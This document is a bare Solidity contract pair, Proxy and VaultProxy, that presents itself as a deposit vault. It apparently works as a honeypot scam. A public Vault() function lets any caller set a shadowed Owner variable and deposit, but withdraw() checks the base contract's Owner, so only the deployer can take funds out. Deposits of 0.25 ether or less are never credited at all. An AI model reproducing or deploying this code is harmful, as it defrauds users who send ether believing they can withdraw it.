pragma solidity ^0.4.23;

contract Proxy  {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
    function proxy(address target, bytes data) public payable {
         
        target.call.value(msg.value)(data);
    }
}

contract VaultProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }
    
    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            deposit();
        }
    }
    
    function deposit() public payable {
        uint256 depositAmount = msg.value;
        if (depositAmount > 0.25 ether) {
            Deposits[msg.sender] += depositAmount;
        }
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        address withdrawer = msg.sender;
        uint256 withdrawAmount = amount;
        if (withdrawAmount > 0 && Deposits[withdrawer] >= withdrawAmount) {
            withdrawer.transfer(withdrawAmount);
        }
    }
}